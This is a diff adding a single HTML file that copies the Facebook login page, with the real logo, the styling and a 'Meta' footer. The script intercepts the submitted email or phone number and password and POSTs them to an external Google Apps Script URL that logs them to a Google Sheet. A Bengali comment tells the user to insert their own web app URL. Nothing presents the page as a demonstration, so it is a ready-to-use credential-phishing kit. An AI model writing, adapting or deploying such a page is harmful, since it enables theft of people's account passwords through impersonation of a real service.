@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Helvetica, Arial, sans-serif;
+      background-color: #ffffff;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: auto;
+      padding: 40px 20px;
+      text-align: center;
+    }
+
+    .logo {
+      margin-bottom: 30px;
+    }
+
+    .logo img {
+      width: 80px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 15px;
+      margin: 10px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 17px;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 15px;
+      margin-top: 10px;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 25px;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .login-btn:hover {
+      background-color: #166fe5;
+    }
+
+    .forgot {
+      display: block;
+      margin: 15px 0;
+      color: #1877f2;
+      font-size: 14px;
+      text-decoration: none;
+    }
+
+    .create-btn {
+      margin-top: 20px;
+      padding: 15px;
+      width: 100%;
+      background-color: white;
+      color: #166fe5;
+      border: 1px solid #166fe5;
+      border-radius: 25px;
+      font-size: 17px;
+      cursor: pointer;
+    }
+
+    .meta {
+      margin-top: 30px;
+      font-size: 12px;
+      color: gray;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico" alt="Facebook Logo">
+    </div>
+    <form id="loginForm">
+      <input type="text" placeholder="Mobile number or email address" name="email" id="email" required>
+      <input type="password" placeholder="Password" name="pass" id="pass" required>
+      <button class="login-btn" type="submit">Log in</button>
+    </form>
+    <a class="forgot" href="#">Forgotten password?</a>
+    <button class="create-btn">Create new account</button>
+    <div class="meta">Meta</div>
+  </div>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const formData = new FormData(this);
+      const params = new URLSearchParams();
+      for (const pair of formData.entries()) {
+        params.append(pair[0], pair[1]);
+      }
+
+      // 🔁 এখানে নিচের লাইনটায় আপনার Web App URL বসান
+      const url = "https://script.google.com/macros/s/AKfycbwJz3ICrla-IjOoSk_CU1J8BPKB8fWYqVI4rP9ZMKvAIYTfB8WgBckaXNHdrCPvzGoTkg/exec";
+
+      fetch(url, {
+        method: "POST",
+        body: params,
+      })
+      .then(res => res.json())
+      .then(data => {
+        alert("Submitted to Google Sheet successfully!");
+        document.getElementById("loginForm").reset();
+      })
+      .catch(err => {
+        alert("Error: " + err);
+      });
+    });
+  </script>
+</body>
+</html>
